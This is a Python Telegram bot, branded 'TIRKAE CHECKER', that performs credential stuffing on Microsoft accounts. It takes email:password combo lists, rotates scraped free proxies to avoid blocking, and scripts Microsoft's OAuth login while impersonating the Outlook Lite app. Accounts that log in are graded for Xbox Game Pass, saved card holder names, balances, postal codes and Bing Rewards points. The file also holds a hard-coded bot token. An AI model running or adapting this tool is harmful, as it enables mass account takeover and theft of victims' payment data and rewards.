import threading
import queue
import requests
import re
import json
import time
import os
import shutil
import random
import uuid
from urllib.parse import unquote, quote
from datetime import datetime
from collections import deque
from pathlib import Path
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ---------- CONFIGURATION ----------
TOKEN = "8546104943:AAEDyvR1xxw8YfHpc-c4TCi0Ko3iuCt9f1g"
ADMIN_ID = 7265489223

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# ---------- PROXY MANAGER ----------
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.lock = threading.Lock()
        self.last_refresh = 0
        self.refresh_interval = 300
        self.running = True
        self.refresh_thread = threading.Thread(target=self._auto_refresh, daemon=True)
        self.refresh_thread.start()

    def _auto_refresh(self):
        while self.running:
            self.refresh()
            time.sleep(self.refresh_interval)

    def refresh(self):
        print("[PROXY] Refreshing proxy pool...")
        scraped = self._scrape_proxies()
        if not scraped:
            return
        working = []
        for proxy in scraped:
            if self._test_proxy(proxy):
                working.append(proxy)
        with self.lock:
            self.proxies = working
            self.last_refresh = time.time()
        print(f"[PROXY] Pool updated: {len(working)} working proxies.")

    def _scrape_proxies(self):
        proxies = []
        sources = [
            "https://www.sslproxies.org/",
            "https://free-proxy-list.net/",
            "https://www.us-proxy.org/",
            "https://www.socks-proxy.net/"
        ]
        for url in sources:
            try:
                r = requests.get(url, timeout=10)
                if r.status_code == 200:
                    matches = re.findall(r'<tr><td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>', r.text)
                    for ip, port in matches:
                        proxies.append(f"http://{ip}:{port}")
            except:
                continue
        return list(set(proxies))

    def _test_proxy(self, proxy):
        try:
            test_url = "http://httpbin.org/ip"
            proxies_dict = {"http": proxy, "https": proxy}
            r = requests.get(test_url, proxies=proxies_dict, timeout=10)
            return r.status_code == 200
        except:
            return False

    def get_proxy(self):
        with self.lock:
            if self.proxies:
                return random.choice(self.proxies)
        return None

    def remove_proxy(self, proxy):
        with self.lock:
            if proxy in self.proxies:
                self.proxies.remove(proxy)

proxy_manager = ProxyManager()

# ---------- XBOX CHECKER ----------
class XboxChecker:
    def __init__(self, debug=False):
        self.debug = debug

    def log(self, message):
        if self.debug:
            print("[XBOX DEBUG] " + message)

    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining)
        except:
            return "0"

    def check(self, email, password, proxy_dict=None):
        try:
            self.log("Checking: " + email)
            session = requests.Session()
            if proxy_dict:
                session.proxies = proxy_dict
            correlation_id = str(uuid.uuid4())

            # Step 1: IDP Check
            self.log("Step 1: IDP check...")
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = session.get(url1, headers=headers1, timeout=15)
            self.log("IDP Response: " + str(r1.status_code))
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD", "data": {}}
            if "MSAccount" not in r1.text:
                return {"status": "BAD", "data": {}}

            # Step 2: OAuth authorize
            time.sleep(0.5)
            url2 = ("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                    "?client_info=1&haschrome=1&login_hint=" + email +
                    "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                    "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                    "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D")
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                return {"status": "BAD", "data": {}}
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            # Step 3: Login POST
            login_data = ("i13=1&login=" + email + "&loginfmt=" + email +
                          "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" +
                          password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx="
                          "&hpgrequestid=&PPFT=" + ppft +
                          "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
                          "&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960")
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                return {"status": "BAD", "data": {}}
            if "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "2FACTOR", "data": {}}
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BANNED", "data": {}}
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "data": {}}
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "data": {}}
            code = code_match.group(1)
            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD", "data": {}}
            cid = mspcid.upper()

            # Step 4: Get access token
            token_data = ("client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                          "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                          "&grant_type=authorization_code&code=" + code +
                          "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access")
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                              data=token_data,
                              headers={"Content-Type": "application/x-www-form-urlencoded"},
                              timeout=15)
            if "access_token" not in r4.text:
                return {"status": "BAD", "data": {}}
            token_json = r4.json()
            access_token = token_json["access_token"]

            # Step 5: Get profile info
            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": "Bearer " + access_token,
                "X-AnchorMailbox": "CID:" + cid
            }
            country = ""
            name = ""
            try:
                r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                                 headers=profile_headers, timeout=15)
                if r5.status_code == 200:
                    profile = r5.json()
                    if "location" in profile and profile["location"]:
                        location_val = profile["location"]
                        if isinstance(location_val, str):
                            country = location_val.split(',')[-1].strip()
                        elif isinstance(location_val, dict):
                            country = location_val.get("country", "")
                    if "displayName" in profile and profile["displayName"]:
                        name = profile["displayName"]
            except Exception as e:
                self.log("Profile error: " + str(e))

            # Step 6: Get Xbox payment token
            time.sleep(0.5)
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = ("https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A"
                                "&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
                                "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
                                "&state=" + quote(state_json) + "&prompt=none")
            headers6 = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }
            r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=20)
            payment_token = None
            search_text = r6.text + " " + r6.url
            for pattern in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            if not payment_token:
                return {"status": "FREE", "data": {"country": country, "name": name}}

            # Step 7: Check payment instruments
            payment_data = {"country": country, "name": name}
            subscription_data = {}
            correlation_id2 = str(uuid.uuid4())
            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": correlation_id2,
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site"
            }
            try:
                payment_url = ("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/"
                               "paymentInstrumentsEx?status=active,removed&language=en-US")
                r7 = session.get(payment_url, headers=payment_headers, timeout=15)
                if r7.status_code == 200:
                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
                    if balance_match:
                        payment_data['balance'] = "$" + balance_match.group(1)
                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"',
                                           r7.text, re.DOTALL)
                    if card_match:
                        payment_data['card_holder'] = card_match.group(1)
                    if not country:
                        country_match = re.search(r'"country"\s*:\s*"([^"]+)"', r7.text)
                        if country_match:
                            payment_data['country'] = country_match.group(1)
                    zip_match = re.search(r'"postal_code"\s*:\s*"([^"]+)"', r7.text)
                    if zip_match:
                        payment_data['zipcode'] = zip_match.group(1)
                    city_match = re.search(r'"city"\s*:\s*"([^"]+)"', r7.text)
                    if city_match:
                        payment_data['city'] = city_match.group(1)
            except Exception as e:
                self.log("Payment instruments error: " + str(e))

            # Step 8: Get Bing Rewards
            try:
                rewards_r = session.get("https://rewards.bing.com/", timeout=10)
                points_match = re.search(r'"availablePoints"\s*:\s*(\d+)', rewards_r.text)
                if points_match:
                    payment_data['rewards_points'] = points_match.group(1)
            except:
                pass

            # Step 9: Check subscription
            try:
                trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r8 = session.get(trans_url, headers=payment_headers, timeout=15)
                if r8.status_code == 200:
                    response_text = r8.text
                    premium_keywords = {
                        'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'PC Game Pass': 'PC GAME PASS',
                        'EA Play': 'EA PLAY',
                        'Xbox Live Gold': 'XBOX LIVE GOLD',
                        'Game Pass': 'GAME PASS'
                    }
                    has_premium = False
                    premium_type = "FREE"
                    for keyword, type_name in premium_keywords.items():
                        if keyword in response_text:
                            has_premium = True
                            premium_type = type_name
                            break
                    if has_premium:
                        title_match = re.search(r'"title"\s*:\s*"([^"]+)"', response_text)
                        if title_match:
                            subscription_data['title'] = title_match.group(1)
                        start_match = re.search(r'"startDate"\s*:\s*"([^T"]+)', response_text)
                        if start_match:
                            subscription_data['start_date'] = start_match.group(1)
                        renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
                        if renewal_match:
                            renewal_date = renewal_match.group(1)
                            subscription_data['renewal_date'] = renewal_date
                            subscription_data['days_remaining'] = self.get_remaining_days(renewal_date + "T00:00:00Z")
                        auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', response_text)
                        if auto_match:
                            subscription_data['auto_renew'] = "YES" if auto_match.group(1) == "true" else "NO"
                        amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', response_text)
                        if amount_match:
                            subscription_data['total_amount'] = amount_match.group(1)
                        currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', response_text)
                        if currency_match:
                            subscription_data['currency'] = currency_match.group(1)
                        if not payment_data.get('country'):
                            country_match = re.search(r'"country"\s*:\s*"([^"]+)"', response_text)
                            if country_match:
                                payment_data['country'] = country_match.group(1)
                        subscription_data['premium_type'] = premium_type
                        subscription_data['has_premium'] = True
                        days_rem = subscription_data.get('days_remaining', '0')
                        if days_rem.startswith('-'):
                            return {"status": "EXPIRED", "data": {**payment_data, **subscription_data}}
                        return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
                    else:
                        return {"status": "FREE", "data": payment_data}
            except Exception as e:
                self.log("Subscription error: " + str(e))
                return {"status": "FREE", "data": payment_data}

            return {"status": "FREE", "data": {**payment_data, **subscription_data}}

        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT", "data": {}}
        except Exception as e:
            return {"status": "ERROR", "data": {}}

# ---------- REWARDS POINTS CHECKER (from API code) ----------
class RewardsPointsChecker:
    def __init__(self, debug=False):
        self.debug = debug

    def log(self, msg):
        if self.debug:
            print("[REWARDS DEBUG]", msg)

    def has_dosubmit(self, text):
        return ("DoSubmit" in text or
                "document.fmHF.submit" in text or
                ('onload="' in text and 'submit()' in text.lower()))

    def extract_form_and_submit(self, session, response, max_hops=8):
        current = response
        for i in range(max_hops):
            text = current.text
            if not self.has_dosubmit(text):
                break
            action_match = re.search(r'<form[^>]*action="([^"]+)"', text, re.IGNORECASE)
            if not action_match:
                break
            form_action = action_match.group(1).replace("&amp;", "&")
            form_data = {}
            for name, value in re.findall(r'<input[^>]*name="([^"]*)"[^>]*value="([^"]*)"', text):
                if name:
                    form_data[name] = value
            for value, name in re.findall(r'<input[^>]*value="([^"]*)"[^>]*name="([^"]*)"', text):
                if name and name not in form_data:
                    form_data[name] = value
            method_match = re.search(r'<form[^>]*method="([^"]+)"', text, re.IGNORECASE)
            method = method_match.group(1).upper() if method_match else "POST"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Referer": current.url,
                "Connection": "keep-alive"
            }
            try:
                if method == "GET":
                    current = session.get(form_action, params=form_data, headers=headers, allow_redirects=True, timeout=20)
                else:
                    current = session.post(form_action, data=form_data, headers=headers, allow_redirects=True, timeout=20)
            except:
                break
        return current

    def detect_account_issue(self, url, text=""):
        combined = url + " " + text
        if "account.live.com/recover" in combined:
            return "RECOVER"
        if "account.live.com/Abuse" in combined:
            return "LOCKED"
        if "identity/confirm" in combined:
            return "2FA"
        if "account or password is incorrect" in combined:
            return "BAD"
        return None

    def get_points(self, email, password, proxy_dict=None):
        """
        Returns (status, points, message)
        status: SUCCESS, BAD, 2FA, LOCKED, RECOVER, NOT_ENROLLED, NO_POINTS, ERROR, TIMEOUT, etc.
        points: int or None
        message: string
        """
        session = requests.Session()
        if proxy_dict:
            session.proxies = proxy_dict

        try:
            # Step 1: IDP Check
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": str(uuid.uuid4()),
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = session.get(url1, headers=headers1, timeout=15)
            if r1.status_code != 200:
                return "ERROR", None, "IDP check failed"
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return "BAD", None, "Account type not supported"
            if "MSAccount" not in r1.text:
                return "BAD", None, "Not a Microsoft account"

            # Step 2: OAuth Authorize
            time.sleep(0.3)
            url2 = ("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                    "?client_info=1&haschrome=1&login_hint=" + email +
                    "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                    "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                    "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D")
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                return "ERROR", None, "Could not extract login form"
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            # Step 3: Login POST
            login_data = ("i13=1&login=" + email + "&loginfmt=" + email +
                          "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" +
                          password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx="
                          "&hpgrequestid=&PPFT=" + ppft +
                          "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
                          "&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960")
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)

            issue = self.detect_account_issue(r3.headers.get("Location", ""), r3.text)
            if issue:
                if issue == "2FA":
                    return "2FA", None, "2FA required"
                elif issue in ("LOCKED", "RECOVER"):
                    return issue, None, "Account locked/recovery"
                elif issue == "BAD":
                    return "BAD", None, "Invalid credentials"

            location = r3.headers.get("Location", "")

            if not location and self.has_dosubmit(r3.text):
                r3_final = self.extract_form_and_submit(session, r3)
                issue = self.detect_account_issue(r3_final.url, r3_final.text)
                if issue:
                    if issue == "2FA":
                        return "2FA", None, "2FA required"
                    elif issue in ("LOCKED", "RECOVER"):
                        return issue, None, "Account locked/recovery"
                    elif issue == "BAD":
                        return "BAD", None, "Invalid credentials"
                location = r3_final.url
                code_match = re.search(r'code=([^&"\']+)', r3_final.url + " " + r3_final.text)
                if code_match:
                    location = "?code=" + code_match.group(1)

            if not location:
                nav_match = re.search(r'navigate\("([^"]+)"\)', r3.text)
                if nav_match:
                    location = nav_match.group(1)

            code = None
            if location:
                issue = self.detect_account_issue(location)
                if issue:
                    if issue == "2FA":
                        return "2FA", None, "2FA required"
                    elif issue in ("LOCKED", "RECOVER"):
                        return issue, None, "Account locked/recovery"
                    elif issue == "BAD":
                        return "BAD", None, "Invalid credentials"
                code_match = re.search(r'code=([^&]+)', location)
                if code_match:
                    code = code_match.group(1)

            # Step 4: Token Exchange (optional)
            if code:
                token_data = ("client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                              "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                              "&grant_type=authorization_code&code=" + code +
                              "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access")
                session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                             data=token_data,
                             headers={"Content-Type": "application/x-www-form-urlencoded"},
                             timeout=15)

            # Step 5: Dashboard
            time.sleep(0.3)
            browser = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive"
            }
            r5 = session.get("https://rewards.bing.com/dashboard", headers=browser, allow_redirects=True, timeout=20)
            if self.has_dosubmit(r5.text):
                r5 = self.extract_form_and_submit(session, r5)

            if "login.live.com" in r5.url or "login.microsoftonline.com" in r5.url:
                bing_auth = ("https://login.live.com/oauth20_authorize.srf"
                             "?client_id=0000000040170455"
                             "&scope=service::bing.com::MBI_SSL"
                             "&response_type=token"
                             "&redirect_uri=https%3A%2F%2Fwww.bing.com%2Ffd%2Fauth%2Fsignin%3Faction%3Dinteractive"
                             "&prompt=none")
                r_auth = session.get(bing_auth, headers=browser, allow_redirects=True, timeout=20)
                if self.has_dosubmit(r_auth.text):
                    r_auth = self.extract_form_and_submit(session, r_auth)

                time.sleep(0.3)
                r5 = session.get("https://rewards.bing.com/dashboard", headers=browser, allow_redirects=True, timeout=20)
                if self.has_dosubmit(r5.text):
                    r5 = self.extract_form_and_submit(session, r5)

            if "login.live.com" in r5.url and "rewards" not in r5.url:
                return "AUTH_FAIL", None, "Could not reach rewards dashboard"

            # Step 6: Extract Points
            page = r5.text
            points = None
            patterns = [
                r'"availablePoints"\s*:\s*(\d+)',
                r'"redeemable"\s*:\s*(\d+)',
                r'"lifetimePoints"\s*:\s*(\d+)',
                r'availablePoints["\s:=]+(\d+)',
                r'id="id_rc"[^>]*title="([0-9,]+)',
                r'class="points[^"]*"[^>]*>[\s]*([0-9,]+)',
            ]
            for pattern in patterns:
                match = re.search(pattern, page)
                if match:
                    try:
                        points = int(match.group(1).replace(',', ''))
                        break
                    except ValueError:
                        continue

            if points is None:
                dash_match = re.search(r'var\s+dashboard\s*=\s*(\{.*?\});\s*</script>', page, re.DOTALL)
                if dash_match:
                    try:
                        dash = json.loads(dash_match.group(1))
                        pts = dash.get("userStatus", {}).get("availablePoints")
                        if pts is not None:
                            points = int(pts)
                    except:
                        pass

            if points is None:
                try:
                    api_headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                        "Accept": "application/json, text/plain, */*",
                        "Referer": "https://rewards.bing.com/dashboard",
                        "X-Requested-With": "XMLHttpRequest",
                    }
                    r_api = session.get("https://rewards.bing.com/api/getuserinfo?type=1",
                                        headers=api_headers, allow_redirects=True, timeout=15)
                    if self.has_dosubmit(r_api.text):
                        r_api = self.extract_form_and_submit(session, r_api)
                    try:
                        api_str = json.dumps(r_api.json())
                    except:
                        api_str = r_api.text
                    pts_match = re.search(r'"availablePoints"\s*:\s*(\d+)', api_str)
                    if pts_match:
                        points = int(pts_match.group(1))
                except:
                    pass

            if points is None:
                try:
                    r_fly = session.get("https://www.bing.com/rewardsapp/flyout",
                                        headers=browser, allow_redirects=True, timeout=15)
                    if self.has_dosubmit(r_fly.text):
                        r_fly = self.extract_form_and_submit(session, r_fly)
                    pts_match = re.search(r'"availablePoints"\s*:\s*(\d+)', r_fly.text)
                    if pts_match:
                        points = int(pts_match.group(1))
                except:
                    pass

            if points is not None:
                return "SUCCESS", points, "OK"

            if "signup" in r5.url.lower() or "enroll" in page.lower():
                return "NOT_ENROLLED", None, "Not enrolled"

            return "NO_POINTS", None, "Authenticated but points not found"

        except requests.exceptions.Timeout:
            return "TIMEOUT", None, "Timeout"
        except requests.exceptions.ProxyError:
            return "PROXY_ERROR", None, "Proxy error"
        except Exception as e:
            return "ERROR", None, str(e)

# ---------- BOT SETUP ----------
active_sessions = {}
user_states = {}

def extract_combos(text):
    lines = text.strip().split('\n')
    combos = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith('http'):
            continue
        match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}):([^\s|]+)', line)
        if match:
            email = match.group(1).strip()
            password = match.group(2).strip()
            combos.append(f"{email}:{password}")
        else:
            if ':' in line:
                parts = line.split(':', 1)
                email = parts[0].strip()
                password = parts[1].split()[0].split('|')[0].strip()
                if '@' in email and password:
                    combos.append(f"{email}:{password}")
    return combos

def load_proxies_from_text(text):
    proxies = []
    lines = text.strip().splitlines()
    if not lines:
        return []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if re.match(r'^(http|https|socks4|socks5)://', line, re.IGNORECASE):
            proxies.append(line)
        else:
            proxies.append(f"http://{line}")
    return proxies

def sort_hit_lines_by_points(hit_lines):
    """Sort hit lines for rewards mode by the point value inside [ ]."""
    def extract_points(line):
        try:
            match = re.search(r'\[(\d+)\]', line)
            if match:
                return int(match.group(1))
        except:
            pass
        return 0
    return sorted(hit_lines, key=extract_points)

class CheckerSession:
    def __init__(self, chat_id, message_id, combos, threads_count, mode, use_default_proxies=False, custom_proxies=None):
        self.chat_id = chat_id
        self.message_id = message_id
        self.combos = combos
        self.threads_count = threads_count
        self.mode = mode  # 'hotmail', 'xbox', or 'rewards'
        self.use_default_proxies = use_default_proxies
        self.custom_proxies = custom_proxies if custom_proxies else []
        self.total = len(combos)
        self.hits = 0          # premium (xbox) or hits (hotmail/rewards)
        self.free = 0          # only for xbox
        self.bad = 0
        self.twofa = 0
        self.unknown = 0
        self.checked = 0
        self.retries = 0
        self.stop_flag = threading.Event()
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.hit_lines = []    # premium for xbox, hits for hotmail/rewards
        self.free_lines = []   # only for xbox
        self.bad_lines = []
        self.twofa_lines = []
        self.unknown_lines = []
        self.current_checking = ""
        self.last_update_time = 0
        self.combo_queue = queue.Queue()
        for c in combos:
            self.combo_queue.put(c)

    def get_proxy_dict(self):
        if self.custom_proxies:
            proxy = random.choice(self.custom_proxies)
            return {'http': proxy, 'https': proxy}
        elif self.use_default_proxies:
            proxy = proxy_manager.get_proxy()
            if proxy:
                return {'http': proxy, 'https': proxy}
        return None

    def report_proxy_failure(self, proxy_dict):
        if proxy_dict and self.use_default_proxies:
            proxy_str = proxy_dict.get('http') or proxy_dict.get('https')
            if proxy_str:
                proxy_manager.remove_proxy(proxy_str)

    def get_cpm(self):
        elapsed = time.time() - self.start_time
        if elapsed < 1:
            return 0
        return int((self.checked / elapsed) * 60)

    def get_progress_pct(self):
        if self.total == 0:
            return 0.0
        return round((self.checked / self.total) * 100, 1)

    def get_success_rate(self):
        if self.checked == 0:
            return 0.0
        return round((self.hits / self.checked) * 100, 1)

def build_status_text(s, finished=False):
    pct = s.get_progress_pct()
    cpm = s.get_cpm()
    bar_len = 20
    filled = int(bar_len * pct / 100) if pct > 0 else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    elapsed = time.time() - s.start_time
    mins = int(elapsed // 60)
    secs = int(elapsed % 60)
    status_word = "FINISHED" if finished else "CHECKING"
    current_email = s.current_checking if s.current_checking else "Waiting..."
    if len(current_email) > 30:
        current_email = current_email[:27] + "..."

    # Proxy info
    if s.custom_proxies:
        proxy_info = f"Custom: {len(s.custom_proxies)}"
    elif s.use_default_proxies:
        with proxy_manager.lock:
            proxy_info = f"Auto: {len(proxy_manager.proxies)} live"
    else:
        proxy_info = "None"

    # Mode-specific stats
    if s.mode == 'xbox':
        stats_line = f"✅ Premium: {s.hits}  ◎ Free: {s.free}  ❌ Bad: {s.bad}  🔐 2FA: {s.twofa}  ❓ Unknown: {s.unknown}"
    else:  # hotmail or rewards
        stats_line = f"✅ Hits: {s.hits}  ❌ Bad: {s.bad}  🔐 2FA: {s.twofa}  ❓ Unknown: {s.unknown}"

    text = (
        f"🩸 𝗧𝗜𝗥𝗞𝗔𝗘 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 🩸\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚡ 𝗦𝗧𝗔𝗧𝗨𝗦 : <code>{status_word}</code>\n"
        f"🔥 𝗠𝗢𝗗𝗘 : <code>{s.mode.upper()}</code>\n"
        f"🔥 𝗧𝗛𝗥𝗘𝗔𝗗𝗦 : <code>{s.threads_count}</code>\n"
        f"🌐 𝗣𝗥𝗢𝗫𝗜𝗘𝗦 : <code>{proxy_info}</code>\n"
        f"🕐 𝗘𝗟𝗔𝗣𝗦𝗘𝗗 : <code>{mins}m {secs}s</code>\n\n"
        f"┌──────────────────────────┐\n"
        f"│ 💀 𝗟𝗜𝗩𝗘 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦              │\n"
        f"├──────────────────────────┤\n"
        f"│ {stats_line}\n"
        f"├──────────────────────────┤\n"
        f"│ ⚡ 𝗖𝗣𝗠 : <code>{cpm}</code>\n"
        f"├──────────────────────────┤\n"
        f"│ 📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: <code>{pct}%</code> │ <code>{s.checked}/{s.total}</code>\n"
        f"│ <code>{bar}</code>\n"
        f"├──────────────────────────┤\n"
        f"│ 🔍 <code>{current_email}</code>\n"
        f"└──────────────────────────┘\n"
    )
    return text

